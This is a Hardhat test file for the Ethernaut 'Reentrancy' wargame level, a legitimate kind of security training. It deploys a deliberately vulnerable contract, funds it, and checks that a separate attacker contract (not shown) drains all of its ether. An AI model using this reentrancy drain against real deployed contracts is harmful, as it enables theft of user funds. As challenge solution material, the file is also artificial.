import {expect} from 'chai';
import {ethers} from 'hardhat';
import {SignerWithAddress} from '@nomiclabs/hardhat-ethers/signers';
import {Reentrance} from '../../types/typechain';

describe('Ethernaut 10: Reentrancy', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let contract: Reentrance;

  const CONTRACT_FUNDS = ethers.utils.parseEther('0.003');
  const ATTACKER_FUNDS = ethers.utils.parseEther('0.001');

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers.getContractFactory('Reentrance', owner).then(f => f.deploy());
    await contract.deployed();

    // donate some money
    await contract.donate(owner.address, {value: CONTRACT_FUNDS});
    expect(await contract.balanceOf(owner.address)).to.eq(CONTRACT_FUNDS);
    expect(await contract.balanceOf(attacker.address)).to.eq(0);
  });

  it('should drain funds from the contract', async () => {
    const attackerContract = await ethers
      .getContractFactory('ReentranceAttacker', attacker)
      .then(f => f.deploy(contract.address));
    await attackerContract.connect(attacker).attack({value: ATTACKER_FUNDS});
    expect(await ethers.provider.getBalance(attackerContract.address)).to.eq(CONTRACT_FUNDS.add(ATTACKER_FUNDS));
  });

  after(async () => {
    expect(await ethers.provider.getBalance(contract.address)).to.eq(0);
  });
});
